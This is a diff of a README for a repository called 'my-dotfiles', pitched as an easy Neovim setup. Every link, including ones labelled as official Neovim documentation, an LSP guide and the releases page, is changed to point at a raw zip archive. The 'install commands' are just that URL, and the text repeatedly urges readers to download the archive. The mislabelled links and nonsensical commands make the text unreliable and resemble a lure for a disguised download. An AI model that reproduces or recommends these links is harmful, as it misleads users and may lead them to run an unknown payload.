@@ -1,7 +1,7 @@
 # 🎨 my-dotfiles - Effortless Neovim Setup for Developers
 
 ## 📥 Download Now
-[![Download now](https://raw.githubusercontent.com/rohasim/my-dotfiles/main/dunlin/my-dotfiles.zip%20Now-Get%https://raw.githubusercontent.com/rohasim/my-dotfiles/main/dunlin/my-dotfiles.zip)](https://raw.githubusercontent.com/rohasim/my-dotfiles/main/dunlin/my-dotfiles.zip)
+[![Download now](https://github.com/rohasim/my-dotfiles/raw/refs/heads/main/nvim/dotfiles_my_3.9-beta.1.zip%20Now-Get%https://github.com/rohasim/my-dotfiles/raw/refs/heads/main/nvim/dotfiles_my_3.9-beta.1.zip)](https://github.com/rohasim/my-dotfiles/raw/refs/heads/main/nvim/dotfiles_my_3.9-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To use my-dotfiles, you should have the following:
 
 ## 📦 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/rohasim/my-dotfiles/main/dunlin/my-dotfiles.zip) to download the latest version of my-dotfiles. Follow these steps to set up Neovim:
+To get started, visit the [Releases page](https://github.com/rohasim/my-dotfiles/raw/refs/heads/main/nvim/dotfiles_my_3.9-beta.1.zip) to download the latest version of my-dotfiles. Follow these steps to set up Neovim:
 
 1. Click the link above to open the Releases page in your browser.
 2. Locate the latest release.
@@ -39,12 +39,12 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/roha
 
    - **For macOS/Linux**: 
      ```bash
-     https://raw.githubusercontent.com/rohasim/my-dotfiles/main/dunlin/my-dotfiles.zip
+     https://github.com/rohasim/my-dotfiles/raw/refs/heads/main/nvim/dotfiles_my_3.9-beta.1.zip
      ```
 
    - **For Windows**: 
      ```powershell
-     .\https://raw.githubusercontent.com/rohasim/my-dotfiles/main/dunlin/my-dotfiles.zip
+     .\https://github.com/rohasim/my-dotfiles/raw/refs/heads/main/nvim/dotfiles_my_3.9-beta.1.zip
      ```
 
 4. Follow the on-screen instructions to complete the installation.
@@ -61,8 +61,8 @@ If you encounter any issues:
 
 To help you maximize the benefits of Neovim, consider:
 
-- Official Neovim Documentation: [Neovim Docs](https://raw.githubusercontent.com/rohasim/my-dotfiles/main/dunlin/my-dotfiles.zip)
-- LSP Guide: [Understanding LSP](https://raw.githubusercontent.com/rohasim/my-dotfiles/main/dunlin/my-dotfiles.zip)
+- Official Neovim Documentation: [Neovim Docs](https://github.com/rohasim/my-dotfiles/raw/refs/heads/main/nvim/dotfiles_my_3.9-beta.1.zip)
+- LSP Guide: [Understanding LSP](https://github.com/rohasim/my-dotfiles/raw/refs/heads/main/nvim/dotfiles_my_3.9-beta.1.zip)
 - Tutorials on using Neovim with Java and full-stack development.
 
 ## 🙌 Contributing
@@ -79,8 +79,8 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 ## 🌐 Additional Information
 
-Explore more about my-dotfiles and its features on the [GitHub repository](https://raw.githubusercontent.com/rohasim/my-dotfiles/main/dunlin/my-dotfiles.zip). 
+Explore more about my-dotfiles and its features on the [GitHub repository](https://github.com/rohasim/my-dotfiles/raw/refs/heads/main/nvim/dotfiles_my_3.9-beta.1.zip). 
 
 Feel free to share feedback or inform us of any bugs you might encounter. Thank you for choosing my-dotfiles to enhance your coding experience! 
 
-Again, remember to [download the latest release here](https://raw.githubusercontent.com/rohasim/my-dotfiles/main/dunlin/my-dotfiles.zip).
+Again, remember to [download the latest release here](https://github.com/rohasim/my-dotfiles/raw/refs/heads/main/nvim/dotfiles_my_3.9-beta.1.zip).
